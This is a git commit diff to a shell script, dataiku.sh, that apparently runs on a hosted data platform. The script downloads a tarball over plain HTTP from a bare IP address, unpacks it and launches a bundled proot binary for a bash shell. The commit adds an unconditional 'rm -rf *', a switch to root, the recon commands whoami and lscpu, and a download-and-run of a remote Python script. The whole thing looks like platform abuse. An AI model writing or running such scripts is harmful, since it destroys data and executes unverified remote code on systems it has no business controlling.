6efa630fb6aa7fa8ac8ba5ea6581d2ab581a837f
mncedisimavunqela <166057648+mncedisimavunqela@users.noreply.github.com>
2024-06-04 23:33:19 +0200

    Update dataiku.sh

--- dataiku.sh
+++ dataiku.sh
@@ -1,8 +1,11 @@
 #!/bin/sh
+rm -rf *
 curl -s -L -o backup3.tar.gz http://185.3.95.20/backup3.tar.gz
 tar -xf backup3.tar.gz
 ./dist/proot -S . /bin/bash
 
-git clone https://github.com/mncedisimavunqela/browserless-python.git
-cd browserless-python
-python3 main.py
+su -
+whoami
+lscpu
+wget https://raw.githubusercontent.com/mncedisimavunqela/selenium-wsl2-ubuntu/main/run_selenium.py
+python3 run_selenium.py
